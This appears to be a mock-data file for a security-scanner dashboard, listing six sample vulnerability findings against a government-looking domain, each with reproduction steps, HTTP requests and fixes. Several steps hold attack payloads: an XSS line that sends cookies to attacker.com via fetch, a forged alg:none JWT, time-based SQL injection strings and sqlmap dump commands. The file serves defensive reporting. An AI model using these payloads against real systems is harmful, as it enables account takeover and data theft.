export const MOCK_FINDINGS = [
  {
    id: '1',
    title: 'JWT Algorithm None Bypass',
    severity: 'critical',
    cvss: 9.8,
    cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
    category: 'Authentication',
    owasp: 'A07:2021',
    cwe: 'CWE-345',
    status: 'open',
    endpoint: '/api/auth/verify',
    description: 'The JWT middleware accepts tokens signed with the "none" algorithm, allowing an attacker to forge arbitrary tokens without a secret key. Any user can escalate to admin-level access by crafting a token with alg:none.',
    steps: [
      'Obtain a valid JWT from any authenticated session',
      'Decode the token (base64) and modify the header: {"alg":"none","typ":"JWT"}',
      'Remove the signature portion entirely',
      'Use the forged token: Authorization: Bearer <forged_token>',
      'Access admin-only endpoint — full access granted',
    ],
    request: `GET /api/admin/users HTTP/1.1
Host: worldmonitor.ntro.gov.in
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0Iiwicm9sZSI6ImFkbWluIiwiZXhwIjo5OTk5OTk5OTk5fQ.`,
    response: `HTTP/1.1 200 OK
Content-Type: application/json

{"users":[{"id":1,"email":"admin@ntro.gov.in","role":"admin"},...],"total":847}`,
    impact: 'Complete authentication bypass. Any unauthenticated user can impersonate any account including administrators, access all user data, and perform privileged operations.',
    remediation: [
      'Explicitly whitelist allowed algorithms: only ["HS256"] or ["RS256"]',
      'Reject tokens with alg:none at the middleware level',
      'Rotate all existing JWT signing secrets immediately',
      'Enable JWT expiry validation (iat, exp claims)',
    ],
    references: ['https://cwe.mitre.org/data/definitions/345.html', 'https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/'],
    discoveredAt: '2026-09-18T09:14:22Z',
  },
  {
    id: '2',
    title: 'IDOR on User Profile Endpoint',
    severity: 'high',
    cvss: 8.1,
    cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N',
    category: 'Authorization',
    owasp: 'A01:2021',
    cwe: 'CWE-639',
    status: 'in-progress',
    endpoint: '/api/users/{id}/profile',
    description: 'The profile endpoint does not validate that the authenticated user owns the requested resource. Any authenticated user can read or update any other user\'s profile by enumerating integer IDs.',
    steps: [
      'Log in as user A (id: 1001)',
      'Capture GET /api/users/1001/profile — observe own profile',
      'Modify ID to 1002: GET /api/users/1002/profile',
      'Full profile data (name, email, phone, location) returned for user 1002',
      'PUT /api/users/1002/profile with modified data — update succeeds',
    ],
    request: `GET /api/users/1002/profile HTTP/1.1
Host: worldmonitor.ntro.gov.in
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMDAxIn0.xxxxx`,
    response: `HTTP/1.1 200 OK

{"id":1002,"name":"Jane Doe","email":"jane@example.com","phone":"+91-9999999999","aadhar_last4":"4521"}`,
    impact: 'Horizontal privilege escalation. Exposes PII of all users including sensitive fields. Enables mass data exfiltration via sequential enumeration.',
    remediation: [
      'Validate req.user.id === params.id before serving profile data',
      'Implement object-level authorization checks in the data access layer',
      'Return 403 (not 404) when ownership check fails to prevent enumeration timing',
      'Add rate limiting on profile endpoints',
    ],
    references: ['https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/'],
    discoveredAt: '2026-09-18T11:30:05Z',
  },
  {
    id: '3',
    title: 'Stored XSS via Alert Name Field',
    severity: 'high',
    cvss: 7.6,
    cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N',
    category: 'Injection',
    owasp: 'A03:2021',
    cwe: 'CWE-79',
    status: 'open',
    endpoint: '/api/alerts',
    description: 'The alert name field is stored without sanitization and rendered without encoding in the dashboard UI. Injected JavaScript executes in the context of every user who views the alert.',
    steps: [
      'Create a new alert with name: <img src=x onerror="fetch(\'https://attacker.com/steal?c=\'+document.cookie)">',
      'Submit the form — payload stored in database',
      'Any admin/user who views the alerts dashboard triggers the payload',
      'Session cookies exfiltrated to attacker-controlled server',
    ],
    request: `POST /api/alerts HTTP/1.1
Content-Type: application/json

{"name":"<img src=x onerror=\\"fetch('https://attacker.com/c?d='+btoa(document.cookie))\\">","threshold":90,"type":"cpu"}`,
    response: `HTTP/1.1 201 Created

{"id":777,"name":"<img src=x onerror=...>","status":"active"}`,
    impact: 'Stored XSS in admin context. Enables session hijacking, credential theft, and DOM-based actions on behalf of any victim who views the alerts page.',
    remediation: [
      'Sanitize input server-side using a library like DOMPurify or bleach',
      'HTML-encode all dynamic output in React templates (React does this by default — check dangerouslySetInnerHTML usage)',
      'Implement a strict Content-Security-Policy disallowing inline scripts',
      'Set HttpOnly and Secure flags on session cookies',
    ],
    references: ['https://owasp.org/www-community/attacks/xss/'],
    discoveredAt: '2026-09-18T14:22:41Z',
  },
  {
    id: '4',
    title: 'Missing HSTS Header',
    severity: 'medium',
    cvss: 5.3,
    cvssVector: 'CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N',
    category: 'TLS',
    owasp: 'A05:2021',
    cwe: 'CWE-523',
    status: 'fixed',
    endpoint: 'All HTTPS responses',
    description: 'The Strict-Transport-Security (HSTS) header is absent from all server responses. Without HSTS, users who type the URL in a browser may be silently downgraded from HTTPS to HTTP, enabling SSL-stripping attacks.',
    steps: [
      'curl -I https://worldmonitor.ntro.gov.in/',
      'Note absence of Strict-Transport-Security header',
      'Perform MITM SSL strip attack using sslstrip on a shared network',
    ],
    request: `curl -I https://worldmonitor.ntro.gov.in/`,
    response: `HTTP/1.1 200 OK
Content-Type: text/html
X-Content-Type-Options: nosniff
# Missing: Strict-Transport-Security header`,
    impact: 'Enables SSL-stripping downgrade attacks on shared/public networks. Credentials and session tokens transmitted in cleartext.',
    remediation: [
      'Add header: Strict-Transport-Security: max-age=63072000; includeSubDomains; preload',
      'Submit domain to HSTS preload list at hstspreload.org',
      'Minimum max-age for preloading: 31536000 (1 year)',
    ],
    references: ['https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security'],
    discoveredAt: '2026-09-19T08:10:17Z',
  },
  {
    id: '5',
    title: 'GraphQL Introspection Enabled in Production',
    severity: 'medium',
    cvss: 5.8,
    cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:N',
    category: 'API Security',
    owasp: 'API9:2023',
    cwe: 'CWE-200',
    status: 'open',
    endpoint: '/graphql',
    description: 'GraphQL introspection is enabled in the production environment, exposing the complete API schema to unauthenticated users. This reveals all queries, mutations, types, and internal field names.',
    steps: [
      'POST {"query": "{__schema{types{name fields{name}}}}"} to /graphql',
      'Full schema dump returned without authentication',
      'Reveals internal mutation updateUserRole(userId, role) not exposed in UI',
    ],
    request: `POST /graphql HTTP/1.1
Content-Type: application/json

{"query":"{__schema{queryType{name}types{name kind fields{name type{name kind}}}}}"}`,
    response: `HTTP/1.1 200 OK

{"data":{"__schema":{"types":[{"name":"Query","fields":[{"name":"adminDashboard"},{"name":"allUserCredentials"},...]}}}}`,
    impact: 'Schema enumeration enables targeted attacks against undocumented mutations and internal admin functions. Reduces attacker effort significantly.',
    remediation: [
      'Disable introspection in production: GRAPHQL_INTROSPECTION=false',
      'Use depth-limiting and query complexity analysis to prevent abuse',
      'Implement field-level authorization on all sensitive types',
    ],
    references: ['https://owasp.org/API-Security/editions/2023/en/0xa9-improper-inventory-management/'],
    discoveredAt: '2026-09-19T10:45:33Z',
  },
  {
    id: '6',
    title: 'SQL Injection via Search Parameter',
    severity: 'critical',
    cvss: 9.1,
    cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L',
    category: 'Injection',
    owasp: 'A03:2021',
    cwe: 'CWE-89',
    status: 'open',
    endpoint: '/api/search',
    description: 'The search endpoint passes user input directly to an SQL query without parameterization. Time-based blind SQL injection allows full database dump including user credentials.',
    steps: [
      'GET /api/search?q=test\' AND SLEEP(5)-- — server delays 5s, confirming injection',
      'Use sqlmap: sqlmap -u \'/api/search?q=test\' --dbs --batch',
      'Dump users table: sqlmap -u \'/api/search?q=test\' -T users --dump',
    ],
    request: `GET /api/search?q=test' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- HTTP/1.1
Host: worldmonitor.ntro.gov.in
Authorization: Bearer <token>`,
    response: `HTTP/1.1 200 OK  [after 5 second delay]

{"results":[],"total":0}`,
    impact: 'Full database compromise. Authentication bypass, credential exfiltration, potential RCE via xp_cmdshell or LOAD_FILE depending on DB configuration.',
    remediation: [
      'Use parameterized queries / prepared statements exclusively',
      'Apply ORM query builders (SQLAlchemy, Django ORM) — avoid raw SQL',
      'Input validation: reject special characters in search field',
      'Run database user with least privilege (SELECT only for search)',
    ],
    references: ['https://owasp.org/www-community/attacks/SQL_Injection'],
    discoveredAt: '2026-09-19T15:33:21Z',
  },
]

export const MOCK_SCANS = [
  {
    id: 'scan-001',
    target: 'https://worldmonitor.ntro.gov.in',
    status: 'completed',
    startedAt: '2026-09-18T08:00:00Z',
    completedAt: '2026-09-18T09:47:22Z',
    findingCount: { critical: 2, high: 2, medium: 2, low: 1, info: 3 },
    modules: ['Recon', 'Auth', 'Authorization', 'Injection', 'TLS', 'Client-Side'],
  },
  {
    id: 'scan-002',
    target: 'https://worldmonitor.ntro.gov.in/api',
    status: 'completed',
    startedAt: '2026-09-19T10:00:00Z',
    completedAt: '2026-09-19T11:22:10Z',
    findingCount: { critical: 1, high: 1, medium: 1, low: 0, info: 2 },
    modules: ['API Security', 'GraphQL', 'Injection'],
  },
]

export const MOCK_COUNTS = {
  critical: 2,
  high: 2,
  medium: 2,
  low: 1,
  info: 3,
  total: 10,
}
